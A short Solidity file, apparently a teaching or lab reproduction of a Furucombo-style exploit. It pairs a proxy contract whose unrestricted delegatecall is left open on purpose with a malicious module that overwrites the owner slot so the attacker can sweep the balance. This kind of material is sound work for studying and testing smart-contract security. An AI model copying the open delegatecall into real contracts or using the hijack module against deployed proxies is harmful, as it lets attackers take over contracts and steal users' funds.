// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract VulnerableFurucomboProxy {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function execute(address target, bytes calldata data) external {
        // BUG: any target is delegatecalled with proxy storage context.
        // A malicious target can overwrite owner slot and take control.
        (bool ok, ) = target.delegatecall(data);
        require(ok, "delegatecall failed");
    }

    function sweep(address payable to) external {
        require(msg.sender == owner, "not owner");
        (bool ok, ) = to.call{value: address(this).balance}("");
        require(ok, "send failed");
    }

    receive() external payable {}
}

contract MaliciousInitModule {
    function initAndHijack(address newOwner) external {
        assembly {
            sstore(0, newOwner)
        }
    }
}
